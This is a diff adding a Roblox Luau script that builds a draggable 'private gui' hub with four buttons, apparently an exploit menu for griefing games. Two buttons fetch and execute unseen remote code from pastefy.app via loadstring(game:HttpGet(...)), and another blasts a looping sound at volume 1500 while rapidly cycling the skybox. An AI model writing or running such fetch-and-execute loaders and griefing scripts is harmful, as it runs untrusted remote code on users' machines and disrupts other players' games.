@@ -1,0 +1,258 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- Create the main GUI
+local haxs = Instance.new("ScreenGui")
+haxs.Name = "haxs"
+haxs.Parent = player:WaitForChild("PlayerGui")
+
+local Frame = Instance.new("Frame")
+Frame.Name = "Frame"
+Frame.Parent = haxs
+Frame.BackgroundColor3 = Color3.fromRGB(255, 128, 0)
+Frame.BackgroundTransparency = 0
+Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Frame.BorderSizePixel = 1
+Frame.Position = UDim2.new(0, 100, 0, 100) -- Starting position
+Frame.Size = UDim2.new(0, 200, 0, 250) -- Increased height to fit all buttons
+Frame.AnchorPoint = Vector2.new(0, 0)
+Frame.Visible = true
+Frame.ZIndex = 1
+Frame.ClipsDescendants = false
+Frame.LayoutOrder = 0
+Frame.Active = true -- Need this for dragging
+
+-- Make the frame draggable
+local UserInputService = game:GetService("UserInputService")
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+Frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Frame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+Frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Title label
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Name = "TextLabel"
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
+TextLabel.BackgroundTransparency = 0
+TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel.BorderSizePixel = 1
+TextLabel.Position = UDim2.new(0, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 30)
+TextLabel.Font = Enum.Font.Legacy
+TextLabel.Text = "normal private guiðŸ¤‘ðŸ¤‘ðŸ¤‘"
+TextLabel.TextColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel.TextSize = 8
+TextLabel.TextScaled = false
+TextLabel.TextWrapped = false
+TextLabel.TextTransparency = 0
+TextLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextStrokeTransparency = 1
+TextLabel.AnchorPoint = Vector2.new(0, 0)
+TextLabel.Visible = true
+TextLabel.ZIndex = 2 -- Higher than frame
+TextLabel.ClipsDescendants = false
+TextLabel.LayoutOrder = 0
+TextLabel.Active = false
+TextLabel.LineHeight = 1
+TextLabel.MaxVisibleGraphemes = -1
+
+-- Button 1: project tegma
+local TextButton4 = Instance.new("TextButton")
+TextButton4.Name = "TextButton4"
+TextButton4.Parent = Frame
+TextButton4.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+TextButton4.BackgroundTransparency = 0
+TextButton4.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextButton4.BorderSizePixel = 1
+TextButton4.Position = UDim2.new(0, 0, 0, 30)
+TextButton4.Size = UDim2.new(0, 200, 0, 50)
+TextButton4.Font = Enum.Font.Legacy
+TextButton4.Text = "project tegma"
+TextButton4.TextColor3 = Color3.fromRGB(27, 42, 53)
+TextButton4.TextSize = 8
+TextButton4.TextScaled = false
+TextButton4.TextWrapped = false
+TextButton4.TextTransparency = 0
+TextButton4.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+TextButton4.TextStrokeTransparency = 1
+TextButton4.AnchorPoint = Vector2.new(0, 0)
+TextButton4.Visible = true
+TextButton4.ZIndex = 2
+TextButton4.ClipsDescendants = false
+TextButton4.LayoutOrder = 0
+TextButton4.Active = true
+TextButton4.LineHeight = 1
+TextButton4.MaxVisibleGraphemes = -1
+
+-- Button 2: Snoop Dogg
+local TextButton = Instance.new("TextButton")
+TextButton.Name = "TextButton"
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+TextButton.BackgroundTransparency = 0
+TextButton.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextButton.BorderSizePixel = 1
+TextButton.Position = UDim2.new(0, 0, 0, 80)
+TextButton.Size = UDim2.new(0, 200, 0, 50)
+TextButton.Font = Enum.Font.Legacy
+TextButton.Text = "snoop dogg"
+TextButton.TextColor3 = Color3.fromRGB(27, 42, 53)
+TextButton.TextSize = 8
+TextButton.TextScaled = false
+TextButton.TextWrapped = false
+TextButton.TextTransparency = 0
+TextButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextStrokeTransparency = 1
+TextButton.AnchorPoint = Vector2.new(0, 0)
+TextButton.Visible = true
+TextButton.ZIndex = 2
+TextButton.ClipsDescendants = false
+TextButton.LayoutOrder = 0
+TextButton.Active = true
+TextButton.LineHeight = 1
+TextButton.MaxVisibleGraphemes = -1
+
+-- Button 3: Jumpscare of Team NPC
+local TextButton2 = Instance.new("TextButton")
+TextButton2.Name = "TextButton2"
+TextButton2.Parent = Frame
+TextButton2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+TextButton2.BackgroundTransparency = 0
+TextButton2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextButton2.BorderSizePixel = 1
+TextButton2.Position = UDim2.new(0, 0, 0, 130)
+TextButton2.Size = UDim2.new(0, 200, 0, 50)
+TextButton2.Font = Enum.Font.Legacy
+TextButton2.Text = "jumpscare of team npc"
+TextButton2.TextColor3 = Color3.fromRGB(27, 42, 53)
+TextButton2.TextSize = 8
+TextButton2.TextScaled = false
+TextButton2.TextWrapped = false
+TextButton2.TextTransparency = 0
+TextButton2.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+TextButton2.TextStrokeTransparency = 1
+TextButton2.AnchorPoint = Vector2.new(0, 0)
+TextButton2.Visible = true
+TextButton2.ZIndex = 2
+TextButton2.ClipsDescendants = false
+TextButton2.LayoutOrder = 0
+TextButton2.Active = true
+TextButton2.LineHeight = 1
+TextButton2.MaxVisibleGraphemes = -1
+
+-- Button 4: Photosmasher
+local TextButton3 = Instance.new("TextButton")
+TextButton3.Name = "TextButton3"
+TextButton3.Parent = Frame
+TextButton3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+TextButton3.BackgroundTransparency = 0
+TextButton3.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextButton3.BorderSizePixel = 1
+TextButton3.Position = UDim2.new(0, 0, 0, 180)
+TextButton3.Size = UDim2.new(0, 200, 0, 50)
+TextButton3.Font = Enum.Font.Legacy
+TextButton3.Text = "photosmasher"
+TextButton3.TextColor3 = Color3.fromRGB(27, 42, 53)
+TextButton3.TextSize = 8
+TextButton3.TextScaled = false
+TextButton3.TextWrapped = false
+TextButton3.TextTransparency = 0
+TextButton3.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+TextButton3.TextStrokeTransparency = 1
+TextButton3.AnchorPoint = Vector2.new(0, 0)
+TextButton3.Visible = true
+TextButton3.ZIndex = 2
+TextButton3.ClipsDescendants = false
+TextButton3.LayoutOrder = 0
+TextButton3.Active = true
+TextButton3.LineHeight = 1
+TextButton3.MaxVisibleGraphemes = -1
+
+-- Button click handlers
+TextButton4.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://pastefy.app/iF7TCeZw/raw",true))()
+end)
+
+TextButton.MouseButton1Click:Connect(function()
+    -- This was made by Zer0EXE
+
+	snoop = Instance.new("Sound", game.Workspace)
+	snoop.Name = "snoop dugg?"
+	snoop.SoundId = "rbxassetid://5300345098"
+	snoop.Volume = 1500
+	snoop.Looped = true
+	snoop:Play()
+	
+	if game.Lighting:FindFirstChild("AnimatedSky") then return end
+
+	local imageIds = {
+		131395838,131395847,131395855,131395860,131395868,131395884,131395891,
+		131395897,131395901,131395946,131395957,131395966,131395972,131395979,
+		131395986,131395989,131395993,131395997,131396003,131396007,131396012,
+		131396016,131396019,131396024,131396029,131396037,131396042,131396044,
+		131396046,131396054,131396063,131396068,131396072,131396078,131396091,
+		131396098,131396102,131396108,131396110,131396113,131396116,131396121,
+		131396125,131396133,131396137,131396142,131396146,131396156,131396162,
+		131396164,131396169,131396173,131396176,131396181,131396185,131396188,
+		131396192
+	}
+
+	local sky = Instance.new("Sky")
+	sky.Name = "AnimatedSky"
+	sky.Parent = game.Lighting
+
+	while true do
+		for _, id in ipairs(imageIds) do
+			local url = "http://www.roblox.com/asset/?id=" .. id
+			sky.SkyboxBk = url
+			sky.SkyboxDn = url
+			sky.SkyboxFt = url
+			sky.SkyboxLf = url
+			sky.SkyboxRt = url
+			sky.SkyboxUp = url
+			wait(0.04)
+			
+		end
+	end
+end)
+
+TextButton2.MouseButton1Click:Connect(function()
+    print("Team NPC jumpscare button clicked!")
+    -- Add your jumpscare script here
+end)
+
+TextButton3.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://pastefy.app/EyRo9Shl/raw", true))()
+end)
